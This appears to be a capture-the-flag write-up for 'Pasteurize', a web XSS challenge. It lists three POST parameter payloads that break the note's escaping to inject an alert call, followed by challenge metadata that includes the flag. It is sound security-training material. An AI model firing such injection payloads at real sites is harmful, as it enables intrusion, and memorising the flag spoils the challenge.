# Pasteurize

## Overview

This is a simple XSS challenge. The vulnerability yields in escaping the contents 
of the note. 

## Exploit
Send a note with either of the following query parameters inside POST body:
- `?content[;alert()//]`
- `?content[]=;alert()//`
- `?content=;alert//&content=`

## Metadata

```json
{
  "challenge": {
    "name": "Pasteurize",
    "description": "This doesn't look secure. I wouldn't put even the littlest secret in here. My source tells me that third parties might have implanted it with their little treats already. Can you prove me right?",
    "identifier": "pasteurize",
    "category": "web",
    "points" : 500,
    "flag": "CTF{Express_t0_Tr0ubl3s}",
    "tags": ["easy"],
    "released": true,
    "gae": {
        "app_config": "app/app.yaml",
        "dns-part": "pasteurize"
    },
    "link": "https://pasteurize.web.ctfcompetition.com/"
  }
}
```